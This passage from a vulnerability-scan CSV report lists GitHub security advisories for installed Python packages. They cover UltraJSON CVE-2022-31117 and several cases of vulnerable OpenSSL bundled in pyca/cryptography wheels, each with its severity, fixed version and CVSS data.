Users should upgrade to UltraJSON 5.4.0.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

There is no workaround.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [UltraJSON](http://github.com/ultrajson/ultrajson/issues)

","Medium","5.4.0","false","Fri Jan 27 2023 13:05:22 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-fm67-cv37-96ff","CVE-2022-31117","usr/lib64/python3.9/site-packages/ujson-4.0.2-py3.9","4.0.2","Wed Jul 06 2022 05:05:59 GMT+0800 (中国标准时间)","4.3","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"","pyca/cryptography's wheels include vulnerable OpenSSL
pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source ('sdist') then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.
","Low","41.0.3","false","Wed Aug 02 2023 06:34:41 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-jm77-qphf-c4w8","GHSA-jm77-qphf-c4w8","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Wed Aug 02 2023 06:34:41 GMT+0800 (中国标准时间)","1","1","Low","","",""
"","Vulnerable OpenSSL included in cryptography wheels
pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source ('sdist') then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.
","Low","41.0.0","false","Sat Jun 03 2023 01:13:11 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-5cpq-8wj7-hf2v","GHSA-5cpq-8wj7-hf2v","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Sat Jun 03 2023 01:13:10 GMT+0800 (中国标准时间)","1","1","Low","","",""
"","Vulnerable OpenSSL included in cryptography wheels
pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source ('sdist') then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.
","Low","41.0.4","false","Fri Sep 22 2023 01:07:01 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-v8gr-m533-ghj9","GHSA-v8gr-m533-ghj9","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Fri Sep 22 2023 01:07:01 GMT+0800 (中国标准时间)","1","1","Low","","",""
